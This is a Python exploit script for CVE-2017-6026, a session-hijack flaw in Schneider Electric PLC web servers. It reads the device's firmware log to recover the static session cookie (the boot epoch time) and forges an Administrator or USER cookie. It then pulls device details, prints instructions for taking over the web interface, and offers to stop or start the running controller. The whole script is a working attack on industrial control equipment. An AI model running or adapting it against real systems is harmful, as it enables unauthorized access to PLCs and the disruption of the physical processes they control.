#! /usr/bin/env python3
''' 
	# Exploit Title: Schneider Session Hijack - CVE-2017-6026

        This script will retrieve the website session cookie, which is static after every reboot.
        (This cookie is actually the Epoch time at PLC startup)
        The only prerequisite is that, since the reboot, a user must have been logged in.
                E.g. Administrator (with default password 'admin')
                or   USER (with default password 'USER')

		After retrieving the cookie, various website actions are possible (including a DoS).
		Sample output:
		C:\Users\admin\Desktop>SchneiderSessionHijack.py
		Please enter an IP [10.10.36.224]:
		This device has booted 33 times
		Cookie: 1521612584 (22/03/2018 06:09:44.014)
		----------------
		--- Device:      TM241CE40R
		--- MAC Address: 0080F40B24E0
		--- Firmware:    4.0.2.11
		--- Controller:  Running
		----------------
		Press Enter to close
'''
import urllib.request, urllib.error, urllib.parse, sys

if len(sys.argv) == 2:
    strIP = sys.argv[1]
else:
    strIP = input('Please enter an IP [10.10.36.224]: ')
    if strIP == '': strIP = '10.10.36.224'
FwLogURL = 'http://{}/usr/Syslog/FwLog.txt'.format(strIP)
try:
    FwLogResp = urllib.request.urlopen(urllib.request.Request(FwLogURL)).readlines()
    NumberOfPowerOns = 0
    for line in FwLogResp:
        if b'Firmware core2' in line:
            NumberOfPowerOns += 1
            CookieVal = line.split(b' ')[1].decode()
            BootupTime = line.split(b'(')[1].split(b')')[0].decode()
    NumberOfPowerOns /= 2
    NumberOfPowerOns = int(NumberOfPowerOns)
except:
    print('Error: URL not found.')
    input('Press enter to exit')
    exit()

try:
    CookieVal
except:
    print('Error: {} does not contain the necessary data.'.format(FwLogURL))
    input('Press Enter to Exit')
    exit()

print(('This device has booted ' + str(NumberOfPowerOns) + ' times'))
print(('Cookie: ' + CookieVal + ' (' + BootupTime + ')'))
print('----------------')
input('Press enter to see if the cookie is set on the webserver.'+"\n")

CtrlURL = 'http://{}/plcExchange/getValues/'.format(strIP)
CtrlPost = b'S;100;0;136;s;s;S;2;0;24;w;d;S;1;0;8;B;d;S;1;0;9;B;d;S;1;0;10;B;d;S;1;0;11;B;d;'

try:
    CtrlUser = 'Administrator'
    DataReq = urllib.request.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
    DataResp = urllib.request.urlopen(DataReq).read()
except:
    print('Failure for user \'Administrator\'')
    try:
        CtrlUser = 'USER'
        DataReq = urllib.request.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
        DataResp = urllib.request.urlopen(DataReq).read()
    except:
        print('Failure for user \'USER\'')
        input('Press enter to exit')
        exit(0)

DataResp = DataResp.decode()
print(('### SUCCESS (' + CtrlUser + ') ###'))
print(('--- Device:      ' + DataResp.split(' ')[0]))
print(('--- MAC Address: ' + DataResp.split(';')[0].split(' ')[1][1:]))
print(('--- Firmware:    ' + DataResp.split(';')[2] + '.' + DataResp.split(';')[3] + '.' +DataResp.split(';')[4] + '.' +DataResp.split(';')[5]))
state = DataResp.split(';')[1]
if state == '2':
    print('--- Controller:  Running')
elif state == '1':
    print('--- Controller:  Stopped')
elif state == '0':
    print('--- Controller:  ERROR mode')
print('\n--- To exploit: Create cookie for domain "{}"'.format(strIP))
print('    with name "M258_LOG" and value "{}:{}"'.format(CtrlUser, CookieVal))
print('    and open "http://{}/index2.htm"\n'.format(strIP))
print('----------------')

CtrlPost = b'S;100;0;136;s;s;S;1;2;0;B;d;S;1;2;1;B;d;S;1;2;2;B;d;S;1;2;3;B;d;S;1;2;4;B;d;S;1;2;5;B;d;S;1;2;6;B;d;S;1;2;7;B;d;S;1;2;8;B;d;S;1;2;9;B;d;S;1;2;10;B;d;S;1;2;11;B;d;S;2;0;24;w;d;S;2;0;26;w;d;S;2;0;28;w;d;S;2;0;30;w;d;S;4;0;236;v;d;S;4;0;240;v;d;'
DataReq = urllib.request.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
DataResp = urllib.request.urlopen(DataReq).read().decode()
values = DataResp.split(';')
if not len(values) == 20:
    input('Press enter to close')
    exit()
    
state = values[13]
if state == '1':
    print('----> Controller is stopped')
    ans=input('Start controller [y/N]? ').lower()
    if ans == 'y':
        urllib.request.urlopen(urllib.request.Request('http://' + strIP + '/plcExchange/command/start', headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal}))
elif state == '2':
    print('----> Controller is running')
    ans=input('Stop controller [y/N]? ').lower()
    if ans == 'y':
        urllib.request.urlopen(urllib.request.Request('http://' + strIP + '/plcExchange/command/stop', headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal}))
else:
    print('----> Controller is in error mode')
    
input('Press enter to close')
exit()
